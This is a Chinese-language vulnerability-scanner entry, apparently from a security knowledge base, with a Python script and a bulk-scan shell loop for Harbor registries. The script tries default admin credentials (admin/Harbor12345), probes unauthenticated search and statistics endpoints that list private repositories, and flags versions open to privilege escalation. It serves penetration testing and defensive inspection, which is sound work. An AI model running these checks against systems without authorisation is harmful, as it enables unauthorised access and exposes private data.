---
id: HARBOR-DETECTION
title: "Harbor - 综合漏洞检测脚本"
product: harbor
vendor: VMware/Harbor
version_affected: "all versions"
severity: INFO
tags: [detection, scanner, 综合检测, 默认凭据, 未授权访问, 提权]
fingerprint: ["Harbor", "harbor", "goharbor", "icon_hash=657337228"]
---

## 描述

Harbor综合漏洞检测脚本，一次扫描覆盖所有已知高危漏洞：
- **CVE-2026-4404**: 硬编码默认凭据检测
- **CVE-2022-46463**: 未授权API访问/镜像泄露检测
- **CVE-2019-16097**: 版本匹配判断提权风险
- **未授权统计信息**: 检测额外信息泄露端点

## 适用场景

- 渗透测试中对Harbor目标的快速漏洞评估
- 安全巡检中批量检测Harbor实例
- 红队评估中的容器镜像仓库攻击面探测

## 综合检测脚本

```python
#!/usr/bin/env python3
"""Harbor综合漏洞检测脚本"""
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_harbor(target):
    """Harbor综合漏洞检测"""
    target = target.rstrip('/')
    print(f"\n{'='*60}")
    print(f"[*] 检测目标: {target}")
    print(f"{'='*60}")
    vulns = []

    # 1. 存活与版本检测
    version = None
    try:
        r = requests.get(f"{target}/api/v2.0/systeminfo", verify=False, timeout=10)
        if r.status_code == 200:
            try:
                data = r.json()
                version = data.get('harbor_version', data.get('version_str', 'unknown'))
                print(f"[+] Harbor存活, 版本: {version}")
                auth_mode = data.get('auth_mode', 'unknown')
                self_reg = data.get('self_registration', False)
                print(f"[*] 认证模式: {auth_mode}, 自注册: {self_reg}")
            except:
                print(f"[+] Harbor存活 (无法解析版本)")
        else:
            print(f"[-] 目标可能不是Harbor (状态码: {r.status_code})")
            return vulns
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return vulns

    # 2. CVE-2026-4404 默认凭据
    print(f"\n[*] 检测CVE-2026-4404 (默认凭据)...")
    creds = [("admin", "Harbor12345"), ("admin", "admin")]
    for user, pwd in creds:
        try:
            r = requests.get(f"{target}/api/v2.0/users/current",
                           auth=(user, pwd), verify=False, timeout=10)
            if r.status_code == 200 and "has_admin_role" in r.text:
                is_admin = r.json().get("has_admin_role", False)
                print(f"[+] CVE-2026-4404: 默认凭据有效! {user}/{pwd} 管理员:{is_admin}")
                vulns.append('CVE-2026-4404')
                break
        except:
            continue
    else:
        print(f"[-] 默认凭据无效")

    # 3. CVE-2022-46463 未授权访问
    print(f"\n[*] 检测CVE-2022-46463 (未授权API访问)...")
    try:
        r = requests.get(f"{target}/api/v2.0/search?q=/",
                        verify=False, timeout=10)
        if r.status_code == 200:
            data = r.json()
            repos = data.get('repository', [])
            projects = data.get('project', [])
            if repos or projects:
                print(f"[+] CVE-2022-46463: 未授权可访问! 发现 {len(repos)} 个仓库, {len(projects)} 个项目")
                for repo in repos[:5]:
                    print(f"    - {repo.get('repository_name', 'N/A')}")
                if len(repos) > 5:
                    print(f"    ... 还有 {len(repos)-5} 个")
                vulns.append('CVE-2022-46463')
            else:
                print(f"[-] API可访问但无数据")
        else:
            print(f"[-] 搜索API返回 {r.status_code}")
    except Exception as e:
        print(f"[-] 检测失败: {e}")

    # 4. 未授权统计信息
    try:
        r = requests.get(f"{target}/api/v2.0/statistics",
                        verify=False, timeout=10)
        if r.status_code == 200:
            stats = r.json()
            print(f"[!] 未授权可访问统计信息: {stats.get('private_project_count', '?')} 个私有项目, {stats.get('private_repo_count', '?')} 个私有仓库")
    except:
        pass

    # 5. CVE-2019-16097 版本判断
    if version:
        match = re.search(r'v1\.(7\.[0-5]|8\.[0-2])', version)
        if match:
            print(f"\n[!] 版本 {version} 受CVE-2019-16097影响 (普通用户可创建管理员)")
            vulns.append('CVE-2019-16097-potential')

    print(f"\n[*] 发现 {len(vulns)} 个漏洞: {', '.join(vulns) if vulns else '无'}")
    return vulns

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print(f"用法: python {sys.argv[0]} <url>")
        print(f"示例: python {sys.argv[0]} https://harbor.example.com")
        sys.exit(1)
    check_harbor(sys.argv[1])
```

## 使用方法

```bash
# 单目标检测
python harbor_scanner.py https://harbor.example.com

# 批量检测 (结合shell)
while read target; do python harbor_scanner.py "$target"; done < targets.txt
```

## 检测逻辑说明

| 检测项 | 方法 | 判断依据 |
|-------|------|---------|
| 存活检测 | GET /api/v2.0/systeminfo | 返回200且包含版本信息 |
| CVE-2026-4404 | GET /api/v2.0/users/current + Basic Auth | 返回200且包含has_admin_role |
| CVE-2022-46463 | GET /api/v2.0/search?q=/ | 返回200且repository数组非空 |
| 统计信息泄露 | GET /api/v2.0/statistics | 返回200且包含项目/仓库计数 |
| CVE-2019-16097 | 版本号正则匹配 | 版本匹配v1.7.x或v1.8.0-1.8.2 |

## 关联CVE条目

- [CVE-2026-4404](CVE-2026-4404.md) - 硬编码默认凭据
- [CVE-2022-46463](CVE-2022-46463.md) - 未授权API访问/镜像泄露
- [CVE-2019-16097](CVE-2019-16097.md) - 普通用户创建管理员提权
